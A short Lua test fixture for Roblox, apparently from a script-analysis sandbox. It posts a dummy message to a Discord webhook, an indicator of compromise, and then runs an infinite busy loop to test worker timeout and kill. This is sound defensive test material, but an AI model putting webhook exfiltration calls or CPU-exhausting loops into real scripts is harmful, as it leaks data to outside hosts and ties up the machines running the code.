-- Fixture 5: Infinite CPU busy loop after emitting an IOC, to verify worker timeout + kill.
local HttpService = game:GetService("HttpService")
pcall(function()
	HttpService:PostAsync(
		"https://discord.com/api/webhooks/555666777888/timeout_test_token_abc",
		'{"msg":"before_infinite_loop"}'
	)
end)

while true do
	local _x = 1 + 1
end
